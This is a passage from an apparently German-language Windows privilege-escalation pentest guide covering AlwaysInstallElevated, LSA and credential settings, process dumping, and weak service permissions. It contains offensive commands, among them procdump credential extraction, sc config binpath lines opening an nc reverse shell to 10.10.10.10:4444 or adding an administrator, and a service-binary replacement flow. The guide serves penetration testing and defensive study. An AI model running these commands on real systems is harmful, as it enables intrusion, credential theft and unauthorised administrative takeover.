  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass die Plattform auf x64 gesetzt ist.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Protokolle gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administrator-Kennwörter** und stellt sicher, dass jedes Kennwort auf Computern, die einer Domäne beigetreten sind, **einzigartig, zufällig und regelmäßig aktualisiert** ist. Diese Kennwörter werden sicher in Active Directory gespeichert und können nur von Benutzern eingesehen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Kennwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ab **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System zusätzlich abzusichern.\
[**Weitere Informationen zu LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie pass-the-hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard sind hier verfügbar.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldeinformationen für den Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldeinformationen**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du mehr über **interessante Tokens** und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Passwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe beim Auflisten der Prozesse zuerst, ob sich Passwörter in der Befehlszeile eines Prozesses befinden.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium-debugger**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) laufen, da du sie ausnutzen könntest, um Rechte auszuweiten.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht auftaucht, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozesseigentümer und der Frage zu, ob ein Benutzer mit geringeren Rechten ihn erreichen kann. Allein ein Anwendungsname oder ein Debug-Flag belegt keine Codeausführung über Benutzergrenzen hinweg. Führe die routinemäßige Enumeration passiv durch, statt Debugger-Befehle zu senden.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Überprüfen der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, sollte der Pfad daraufhin geprüft werden, ob Code ausgeführt werden könnte, wenn die Aufgabe oder der Dienst beim nächsten Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Kompatibilität der Module sowie etwaige Deny- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Privilegienausweitung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei des Dienstes und das Run-as-Konto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem üblichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` sowie die ACL des konfigurierten Dokumentstammverzeichnisses, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` ausgeführt wird, könnte die serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Bestätige, dass der Dienst läuft, dass der genaue Pfad ausgeliefert wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis belegt für sich genommen nur die Möglichkeit, Dateien zu erstellen. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`), mit der Konfiguration daneben unter `conf\httpd.conf` und einem standardmäßigen Stammverzeichnis `C:\wamp64\www` oder `C:\wamp\www`. Prüfe zusammen das genaue Dienstabbild, die Run-as-Identität, das effektive `DocumentRoot` (einschließlich der Auflösung von `${INSTALL_DIR}` und Virtual-Host-Überschreibungen) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt nicht, dass Apache als `SYSTEM` läuft oder die eingereichte Datei ausführt. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordne IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Site/Anwendung** zu und ermittle anschließend den konfigurierten Pool und den serverseitigen Handler. Code in einem ausgelieferten Verzeichnis wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor du ein beschreibbares Verzeichnis als Codeausführung einstufst.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der betreffenden .NET-Framework-Installation; `<compilation tempDirectory>` der Anwendung kann den Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit geringeren Berechtigungen generierten Quellcode im Cache einer **bestimmten** Anwendung ändern kann, ermittle, ob diese Anwendung ihn unter einer privilegierteren [Worker-Prozess-Identität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Gleiche den Cache mit der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer etwaigen Neukompilierung ab. Prüfe Metadaten ausschließlich lesend; löse bei der Erfassung keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen üblicherweise als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen besitzt. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerk-Anmeldeinformationen. Ein Pool vom Typ `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität des Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich je nach IIS-Generation unterscheiden. Ermittle daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Wenn Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos erreicht, prüfe die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Ticket des Computerkontos oder eine Hostrolle allein belegen diese nicht. Bei passiver Erfassung sollten Konfiguration und ACLs geprüft werden, ohne Dateien hochzuladen, eine Netzwerkauthentifizierung durchzuführen oder Tickets anzufordern.

Bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, verfolge jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein decodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann durch Shell-Metazeichen den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, ob ein nicht vertrauenswürdiger Aufrufer den decodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermittle anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein localhost-Listener oder eine Schwachstelle im Token-Format allein belegen keine privilegierte Befehlsausführung. Prüfe Quellcode und Pool-Konfiguration, ohne bei der passiven Erfassung gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen beschreiben kann, und zwar unter der Identität des Workers. Vergewissere dich, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, die geltenden PHP-Pfadbeschränkungen das Einbinden erlauben und der Worker tatsächlich mit höheren Berechtigungen läuft. Ein Loopback-Listener oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Erfassung aufzurufen.

### Memory Password mining

Mit **procdump** von sysinternals kannst du einen Speicherdump eines laufenden Prozesses erstellen. Dienste wie FTP haben **Anmeldedaten im Klartext im Speicher**. Versuche, den Speicher zu dumpen und die Anmeldedaten auszulesen.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, das von einem Benutzer mit niedrigeren Rechten beschreibbar ist, überschreitet beim Import unter dem Konto des Importers eine Eingabevertrauensgrenze. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder die Aufgabe, die ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) erlaubte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, wenn die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zuließen. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie während der passiven Enumeration kein manipuliertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), dem bei der Erstellung die angeforderten Dienstzugriffsrechte gewährt werden; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffsprüfung durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendbar wäre. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie während der passiven Enumeration keinen Dienst.

Bei einem Remote-Pfad zur Dienstinstallation müssen diese SCM-Rechte mit einer Freigabe auf dem Ziel korreliert werden, in die **dieselbe Netzwerkanmeldung** schreiben kann, ebenso wie mit der zugrunde liegenden NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zum Ablegen der Datei zugleich vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht, einen Dienst über SCM zu erstellen, belegt nicht, dass der neue Dienst mit höheren Rechten gestartet werden kann.

Ein bestehender Dienst kann beim Start, Herunterfahren oder einem anderen Lebenszyklusereignis ein Hilfsprogramm aufrufen, auch wenn dieses nicht in seinem `ImagePath` angegeben ist. Wird der Name des Hilfsprogramms zu einem Verzeichnis aufgelöst, das von einem Benutzer mit niedrigeren Rechten beschreibbar ist, und läuft der Dienst mit höheren Rechten, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf des Hilfsprogramms**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Rechte zum Erstellen von Verzeichnissen, die Dienstidentität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder beenden Sie den Dienst bei der passiven Prüfung nicht.

Bei einem bestehenden Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) zu unterscheiden. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht bewerten. Wenn der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn es einen separaten privilegierten Verbraucher oder Loader gibt, der diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Erstellen Sie bei der passiven Bestandsaufnahme weder eine Testdatei noch starten Sie den Dienst.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis für die Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Für eine privilegierte Ausführung ist zusätzlich `CheckExternalScripts` (oder ein anderer aktivierter Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und ein Auslöser erforderlich, der ihn unter der Dienstidentität ausführt. Ein ausschließlich an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, aber allein der Dateipfad, das Passwort oder der Listener belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder während der passiven Enumeration die Web-API aufzurufen. Siehe das [Dateilayout von NSClient++](https://nsclient.org/docs/concepts/file-layout/), die [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und die [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert die untergeordnete Anwendung dort](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis angibt. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als gesamte Dienstgrenze betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, der von diesem untergeordneten Prozess bereitgestellt wird, ist ein separater Prüfhinweis: Bestätigen Sie, dass der Listener für den Benutzer mit niedrigeren Rechten erreichbar ist, der genaue Vorgang dessen Eingaben akzeptiert und der Dienstprozess den unsicheren Vorgang mit höheren Rechten ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweist keine Rechteausweitung; rufen Sie während der passiven Enumeration keine Dienstvorgänge auf.

Bei einem benutzerdefinierten WCF-Vorgang verfolgen Sie eine vom Aufrufer kontrollierte Zeichenfolge bis in einen beliebigen PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldeinformationen](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, aber die Berechtigung zum Aufrufen genau dieses Vorgangs und die effektive Identität des Runspaces müssen separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit niedrigeren Rechten zu `AddScript` unter einer höheren Dienstidentität bildet eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Identitätseinstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst beim Eintreten bestimmter Bedingungen zu starten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte lassen sich privilegierte Dienste oft durch Auslösen ihrer Trigger starten. Techniken zur Enumeration und Aktivierung finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio Diagnostic Collector Service

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der so konfiguriert ist, dass er als `LocalSystem` ausgeführt wird. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) nutzte eine Junction und eine Race Condition mit einem Object-Manager-Link, um eine Zurücksetzung der Dienst-DACL umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer MSI-Reparaturpfad des Visual Studio Setup WMI Providers sowie dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei einer passiven Triage das Konto und den Binärpfad dieses Dienstes, ob der Pfad des Setup-WMI-Compilers vorhanden ist und den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Liste der Dienste abrufen:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Mit **sc** kannst du Informationen zu einem Dienst abrufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er entweder deaktiviert ist oder keine aktivierten Geräte zugeordnet sind._

Sie können ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachten Sie, dass der Dienst upnphost (unter XP SP1) von SSDPSRV abhängt, damit er funktioniert.**

**Ein weiterer Workaround** für dieses Problem ist die Ausführung von:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authentifizierte Benutzer“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So lässt sich **sc** ändern und ausführen:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Rechte eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Dienstkonfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Umfasst auch die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Umfasst ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Sicherheitslücke kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder als privilegiertes Domänenkonto ausgeführt wird, **Benutzer mit geringen Berechtigungen aber die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst häufig kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst mit **wmic** (nicht in system32) alle von einem Dienst ausgeführten Binärdateien ermitteln und deine Berechtigungen mit **icacls** überprüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Suche nach gefährlichen ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Dienst-Executable oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Missbrauchsablauf ist:<sup>[[27]](#references)</sup>

1. Bestätige das Dienstkonto und den Pfad zur Executable mit `sc qc <service_name>`.
2. Bestätige mit `icacls <path>`, dass die Binary beschreibbar ist.
3. Ersetze die Dienst-Binary durch einen Payload oder eine gültige schädliche Dienst-Binary.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / einen Dienst-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
